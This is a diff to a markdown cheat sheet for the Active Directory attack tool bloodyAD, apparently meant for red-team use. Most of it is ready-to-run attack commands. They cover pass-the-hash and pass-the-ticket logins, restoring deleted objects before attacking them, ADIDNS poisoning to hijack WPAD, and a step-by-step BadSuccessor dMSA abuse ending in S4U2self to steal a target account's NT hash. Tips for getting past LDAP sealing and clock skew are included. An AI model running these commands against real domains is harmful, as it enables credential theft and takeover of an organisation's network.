@@ -17,15 +17,21 @@ Authentication follows standard Impacket-style formats but with specific argumen
 
 ```bash
 # Cleartext
-bloodyAD -H <DC_IP> -d <domain> -u <username> -p <password> <command>
+bloodyAD --host <DC_IP> -d <domain> -u <username> -p <password> <command>
 
-# Pass-The-Hash (NTLM) - Uses LMHASH:NTHASH or just NTHASH depending on format, but full format is safer
-bloodyAD -H <DC_IP> -d <domain> -u <username> -p aad3b435b51404eeaad3b435b51404ee:<NTHash> <command>
+# Pass-The-Hash (NTLM)
+bloodyAD --host <DC_IP> -d <domain> -u <username> -p aad3b435b51404eeaad3b435b51404ee:<NTHash> <command>
 
-# Kerberos Pass-The-Ticket (-k flag with optional ccache keyword)
-export KRB5CCNAME=/tmp/ticket.ccache
-bloodyAD -H <DC_IP> -d <domain> -k <command>
+# Kerberos Pass-The-Ticket
+export KRB5CCNAME=/path/to/ticket.ccache
+bloodyAD --host <DC_IP> -d <domain> -u <username> -k <command>
 ```
+
+**Critical gotchas:**
+
+- **Always pass `-u <username>` even with `-k`.** Without it, bloodyAD searches `sAMAccountName=None` and fails silently or returns zero results. The `-k` flag enables Kerberos transport; `-u` still identifies which object to look up.
+- **Clock skew**: bloodyAD auto-detects and corrects clock skew up to several hours ("Clock skew detected. Adjusting..."). No manual `faketime` or `ntpdate` needed — unlike impacket tools.
+- **LDAP sealing**: bloodyAD uses SASL sign+seal on port 389, which satisfies `strongerAuthRequired`. Use bloodyAD when impacket's raw LDAP bind fails with `strongerAuthRequired` or when LDAPS (636) TLS handshake resets.
 
 ## Common Exploitation Workflows
 
@@ -76,5 +82,52 @@ Used to hijack WPAD, internal resources, or relay targets by poisoning `ADIDNS`.
 bloodyAD -H 10.10.10.10 -d contoso.local -u attacker -p pass add dnsRecord evil_wpad 192.168.1.50
 ```
 
+### 8. Restore Deleted AD Object
+
+If a target object was soft-deleted (moved to `CN=Deleted Objects`), restore it before attacking.
+
+```bash
+# Find deleted object (include deleted objects in search)
+bloodyAD --host <DC_IP> -d <domain> -u <username> -p <password> \
+  get object "CN=<name>\0ADEL:<guid>,CN=Deleted Objects,DC=<domain>,DC=<tld>"
+
+# Restore (moves object back to its original OU, re-enables it)
+bloodyAD --host <DC_IP> -d <domain> -u <username> -p <password> \
+  set restore "CN=<name>\0ADEL:<guid>,CN=Deleted Objects,DC=<domain>,DC=<tld>"
+```
+
+The GUID (`0ADEL:<guid>`) is part of the CN and must be quoted. Requires Write rights on the deleted object (visible in BloodHound even for deleted objects).
+
+### 9. BadSuccessor (dMSA abuse)
+
+Create a delegated MSA linked to a target account, then extract its credentials via S4U2self.
+
+```bash
+# Full (pre-patch / single actor with both CREATE_CHILD on OU and WRITE on target):
+bloodyAD --host <DC_IP> -d <domain> -u <username> -p <password> \
+  add badSuccessor <new_dmsa_name> \
+  -t "CN=<target>,OU=<ou>,DC=<domain>,DC=<tld>" \
+  --ou "OU=<ou>,DC=<domain>,DC=<tld>"
+
+# Post-patch split (actor A has CREATE_CHILD on OU, actor B has WRITE on target):
+# Step 1 — Actor A: create dMSA, skip writing msDS-Superseded* on target
+bloodyAD --host <DC_IP> -d <domain> -u <actor_a> -p <pass_a> \
+  add badSuccessor <new_dmsa_name> \
+  -t "CN=<target>,OU=<ou>,DC=<domain>,DC=<tld>" \
+  --ou "OU=<ou>,DC=<domain>,DC=<tld>" \
+  --prepatch
+
+# Step 2 — Actor B: write msDS-Superseded* on target (via GenericWrite / LDAP)
+# (bloodyAD set object or PowerShell S.DS.P with Negotiate+Sealing as Actor B)
+
+# Step 3 — Actor A: run S4U2self to steal target's NT hash
+badS4U2self "kerberos+ccache://domain\<actor_a>:<actor_a>.ccache@<DC_IP>" \
+  "krbtgt/<domain>@<DOMAIN>" "<new_dmsa_name>\$@<DOMAIN>" --dmsa
+# Output: target account's RC4/NT hash (only RC4 yielded via dMSA key package)
+```
+
+`badS4U2self` is in the `bloodyad` venv (`venvs/bloodyad/bin/`). Clock skew for `badS4U2self` must be corrected with `sudo date -u -s "<DC_time>"` immediately before running (it does not auto-correct like bloodyAD).
+
 ## Anti-Patterns
-- Modifying standard Domain Admin passwords or altering live production `Domain Admins` groups is extremely noisy and often forbidden by red-team Rules of Engagement. Prefer Shadow Credentials or RBCD on computer accounts whenever possible. 
+- Modifying standard Domain Admin passwords or altering live production `Domain Admins` groups is extremely noisy and often forbidden by red-team Rules of Engagement. Prefer Shadow Credentials or RBCD on computer accounts whenever possible.
+- Do not skip `-u <username>` when using `-k` — without it bloodyAD fails to identify the authenticated principal.
